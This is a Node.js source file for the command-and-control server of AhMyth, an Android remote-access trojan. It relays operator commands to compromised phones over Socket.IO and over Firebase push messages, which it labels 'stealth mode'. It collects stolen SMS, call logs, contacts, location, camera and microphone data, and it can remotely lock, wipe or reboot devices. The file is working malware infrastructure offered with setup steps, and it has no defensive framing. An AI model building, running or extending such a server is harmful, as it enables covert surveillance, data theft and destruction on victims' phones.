/**
 * AhMyth C2 Server — Demo Dashboard Server with FCM C2 Channel
 * ==============================================================
 * Serves the interactive C2 dashboard + Socket.IO relay + FCM push.
 *
 * USAGE:
 *   1. Install:  npm install socket.io express firebase-admin firebase-admin
 *   2. Set up Firebase: see FCM_SETUP.md
 *   3. Run:      node .freebuff/c2-server.js
 *   4. Open:     http://localhost:42474
 *
 * CHANNELS:
 *   - Socket.IO (persistent):   Direct WebSocket — used by default
 *   - FCM (push trigger):       Firebase Cloud Messaging — stealth mode
 *
 * The Android client connects via Socket.IO by default.
 * When FCM is configured, commands can also be pushed via Firebase.
 */

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const PORT = 42474;
const DASHBOARD_PATH = path.join(__dirname, 'c2-dashboard.html');
const SERVICE_ACCOUNT_PATH = path.join(__dirname, 'service-account.json');

// ---- Firebase Admin SDK (optional - only if service-account.json exists) ----
let fcmAvailable = false;
let firebaseAdmin = null;

try {
  if (fs.existsSync(SERVICE_ACCOUNT_PATH)) {
    firebaseAdmin = require('firebase-admin');
    const serviceAccount = JSON.parse(fs.readFileSync(SERVICE_ACCOUNT_PATH, 'utf8'));

    firebaseAdmin.initializeApp({
      credential: firebaseAdmin.credential.cert(serviceAccount),
    });

    fcmAvailable = true;
    console.log('[FCM] Firebase Admin SDK initialized successfully');
  } else {
    console.log('[FCM] No service-account.json found — FCM push disabled');
    console.log(`[FCM] Place your Firebase service account key at: ${SERVICE_ACCOUNT_PATH}`);
  }
} catch (err) {
  console.log('[FCM] Failed to initialize Firebase:', err.message);
  console.log('[FCM] FCM push will be disabled');
}

// Track FCM-registered devices: deviceId -> { fcmToken, model, manufacturer, ... }
const fcmDevices = new Map();

// ---- Express setup ----
const app = express();
const server = http.createServer(app);

app.use(express.json({ limit: '10mb' })); // For receiving FCM token registrations + results

// ---- Routes ----

// Serve dashboard
app.get('/', (req, res) => {
  if (fs.existsSync(DASHBOARD_PATH)) {
    res.sendFile(DASHBOARD_PATH);
  } else {
    res.status(500).send('Dashboard file not found at: ' + DASHBOARD_PATH);
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    clients: getConnectedDevices(),
    fcmAvailable,
    fcmDevices: fcmDevices.size,
  });
});

/**
 * POST /api/fcm/register
 * Registers a device's FCM token with the server.
 * Called by the Android FirebaseMessagingService when a new token is generated.
 */
app.post('/api/fcm/register', (req, res) => {
  try {
    const { token, model, manufacturer, release, deviceId } = req.body;

    if (!token) {
      return res.status(400).json({ error: 'Missing FCM token' });
    }

    const deviceKey = deviceId || token.substring(0, 12);
    fcmDevices.set(deviceKey, {
      fcmToken: token,
      model: model || 'Unknown',
      manufacturer: manufacturer || 'Unknown',
      release: release || 'Unknown',
      deviceId: deviceId || 'unknown',
      registeredAt: new Date().toISOString(),
    });

    console.log(`[FCM] Device registered: ${model || 'Unknown'} (token: ${token.substring(0, 12)}...)`);
    console.log(`[FCM] Total FCM devices: ${fcmDevices.size}`);

    res.json({ status: 'registered', deviceKey });
  } catch (err) {
    console.error('[FCM] Registration error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

/**
 * POST /api/fcm/push
 * Sends a command to a device via FCM push.
 * Called by the dashboard when FCM mode is selected.
 *
 * Body: { targetDeviceId, command: { order, extra, ... } }
 *   OR  { targetFcmToken, command: { order, extra, ... } }
 */
app.post('/api/fcm/push', async (req, res) => {
  if (!fcmAvailable) {
    return res.status(503).json({ error: 'FCM not configured', fcmSetup: 'See FCM_SETUP.md' });
  }

  try {
    const { targetDeviceId, targetFcmToken, command } = req.body;

    if (!command || !command.order) {
      return res.status(400).json({ error: 'Missing command with order field' });
    }

    // Resolve FCM token
    let fcmToken = targetFcmToken;
    if (!fcmToken && targetDeviceId && fcmDevices.has(targetDeviceId)) {
      fcmToken = fcmDevices.get(targetDeviceId).fcmToken;
    }

    if (!fcmToken) {
      return res.status(404).json({ error: 'Device not found via FCM. Register first.' });
    }

    console.log(`[FCM] Pushing command to ${fcmToken.substring(0, 12)}...:`, command);

    // Build FCM data payload
    const message = {
      data: Object.fromEntries(
        Object.entries(command).map(([k, v]) => [k, String(v)])
      ),
      token: fcmToken,
    };

    const response = await firebaseAdmin.messaging().send(message);
    console.log(`[FCM] Push sent successfully: ${response}`);

    res.json({ status: 'sent', fcmMessageId: response });

  } catch (err) {
    console.error('[FCM] Push error:', err.message);
    // If token is invalid, remove it from registry
    if (err.code === 'messaging/registration-token-not-registered') {
      // Find and remove the stale token
      for (const [key, val] of fcmDevices) {
        if (val.fcmToken === req.body.targetFcmToken || key === req.body.targetDeviceId) {
          fcmDevices.delete(key);
          console.log(`[FCM] Removed stale token for device: ${key}`);
          break;
        }
      }
    }
    res.status(500).json({ error: err.message });
  }
});

/**
 * GET /api/fcm/devices
 * Returns all FCM-registered devices.
 */
app.get('/api/fcm/devices', (req, res) => {
  const devices = Array.from(fcmDevices.entries()).map(([key, val]) => ({
    deviceKey: key,
    model: val.model,
    manufacturer: val.manufacturer,
    release: val.release,
    deviceId: val.deviceId ? val.deviceId.substring(0, 12) + '...' : '...',
    registeredAt: val.registeredAt,
  }));
  res.json({ devices, count: devices.length });
});

// ---- Socket.IO: C2 relay (kept for backward compatibility + brief connections) ----
const io = new Server(server, {
  cors: { origin: '*' },
  pingTimeout: 60000,
  pingInterval: 25000,
});

const connectedDevices = new Map();
const dashboards = new Set();

function getConnectedDevices() {
  return Array.from(connectedDevices.values());
}

io.on('connection', (socket) => {
  const query = socket.handshake.query || {};
  const isDashboard = query._dashboard === 'true';

  if (!isDashboard) {
    // Android device connecting (persistent or brief FCM-triggered)
    const deviceInfo = {
      socketId: socket.id,
      model: query.model || 'Unknown',
      manufacturer: query.manf || 'Unknown',
      androidVersion: query.release || 'Unknown',
      deviceId: (query.id || '').substring(0, 8) + '...',
      connectedAt: new Date().toISOString(),
      channel: query._fcm ? 'fcm-triggered' : 'persistent',
    };
    connectedDevices.set(socket.id, deviceInfo);
    console.log(`[${deviceInfo.channel}] Device: ${deviceInfo.model} (${deviceInfo.manufacturer})`);

    io.emit('devices:update', getConnectedDevices());

    const dataEvents = [
      'x0000sm', 'x0000cl', 'x0000cn', 'x0000lm', 'x0000apps',
      'x0000ca', 'x0000mc', 'x0000sc', 'x0000fm',
      'x0000runApp', 'x0000openUrl', 'x0000dm',
      'x0000lockDevice', 'x0000wipeDevice', 'x0000rebootDevice',
      'x0000deleteFF', 'x0000nt',
    ];

    dataEvents.forEach((event) => {
      socket.on(event, (data) => {
        const label = deviceInfo.channel === 'fcm-triggered' ? '📨' : '📥';
        console.log(`${label} ${event} from ${deviceInfo.model}:`, JSON.stringify(data).substring(0, 200));
        io.emit('device:response', {
          socketId: socket.id,
          deviceInfo: {
            model: deviceInfo.model,
            manufacturer: deviceInfo.manufacturer,
            channel: deviceInfo.channel,
          },
          event,
          data,
          timestamp: new Date().toISOString(),
        });
      });
    });

    socket.on('disconnect', () => {
      if (deviceInfo.channel === 'fcm-triggered') {
        console.log(`[FCM] Brief connection ended: ${deviceInfo.model}`);
      } else {
        console.log(`[-] Device disconnected: ${deviceInfo.model}`);
      }
      connectedDevices.delete(socket.id);
      io.emit('devices:update', getConnectedDevices());
    });

  } else {
    // Dashboard connection
    dashboards.add(socket.id);
    console.log(`[+] Dashboard connected: ${socket.id}`);

    socket.emit('devices:update', getConnectedDevices());
    socket.emit('fcm:status', { available: fcmAvailable, devices: fcmDevices.size });

    socket.on('command:send', (payload) => {
      const { targetSocketId, command, useFcm } = payload || {};

      // If FCM is requested and available, push via Firebase instead
      if (useFcm && fcmAvailable) {
        // Find the device's FCM token
        const deviceEntry = Array.from(fcmDevices.entries()).find(
          ([key, val]) => val.model && connectedDevices.has(targetSocketId) &&
            devices[targetSocketId]?.model === val.model
        );

        if (deviceEntry) {
          const [deviceKey, deviceData] = deviceEntry;
          // Push via FCM
          fetch(`http://localhost:${PORT}/api/fcm/push`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ targetFcmToken: deviceData.fcmToken, command }),
          }).then(r => r.json()).then(result => {
            socket.emit('command:sent', {
              targetSocketId,
              command,
              channel: 'fcm',
              timestamp: new Date().toISOString(),
            });
          }).catch(err => {
            socket.emit('command:error', { message: 'FCM push failed: ' + err.message });
          });
          return;
        }
      }

      // Fallback: send via Socket.IO
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket) {
        console.log(`[➡️] Forwarding command to ${targetSocketId}:`, JSON.stringify(command));
        targetSocket.emit('order', command);
        socket.emit('command:sent', {
          targetSocketId,
          command,
          channel: 'socket.io',
          timestamp: new Date().toISOString(),
        });
      } else {
        socket.emit('command:error', {
          message: 'Target device is no longer connected (Socket.IO). Try FCM mode if configured.',
          targetSocketId,
        });
      }
    });

    socket.on('fcm:register', () => {
      socket.emit('fcm:status', { available: fcmAvailable, devices: fcmDevices.size });
    });

    socket.on('disconnect', () => {
      dashboards.delete(socket.id);
      console.log(`[-] Dashboard disconnected: ${socket.id}`);
    });
  }
});

// ---- Start server ----
server.listen(PORT, '0.0.0.0', () => {
  console.log('');
  console.log('╔══════════════════════════════════════════════════════╗');
  console.log('║       AhMyth C2 Server — FCM + Socket.IO           ║');
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log(`║  Dashboard:  http://localhost:${PORT}                  ║`);
  console.log(`║  Socket.IO:  ${PORT} (persistent + brief connections)   ║`);
  console.log(`║  FCM Push:   ${fcmAvailable ? '✅ Active' : '❌ Not configured'}                    ║`);
  console.log(`║  FCM Devices: ${fcmDevices.size} registered               ║`);
  console.log('╠══════════════════════════════════════════════════════╣');
  console.log('║  Update app/build.gradle:                            ║');
  console.log(`║  SOCKET_URL = "http://YOUR_IP:${PORT}"                 ║`);
  console.log('╚══════════════════════════════════════════════════════╝');
  console.log('');
  console.log('Waiting for connections...');
});
